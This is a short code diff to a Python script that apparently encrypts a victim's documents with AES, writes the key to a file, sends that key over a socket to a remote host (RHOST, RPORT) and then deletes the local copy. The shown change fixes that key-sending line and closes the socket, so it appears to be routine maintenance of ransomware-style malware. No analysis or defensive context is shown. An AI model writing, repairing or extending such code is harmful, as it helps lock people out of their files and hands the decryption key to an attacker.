@@ -9,6 +9,8 @@ from Crypto.Hash import SHA256 as sha
 import socket
 from time import sleep
 
+import colorama
+
 KSIZE = 1024
 
 class myAES():
@@ -132,5 +134,7 @@ searchEncFile(documentPath)
 
 kk = open(keyPath + 'key.txt', 'wb+')
 
-sock.send(kk)
+sock.sendto(kk, (RHOST, RPORT))
 os.remove(keyPath + 'key.txt')
+
+sock.close()
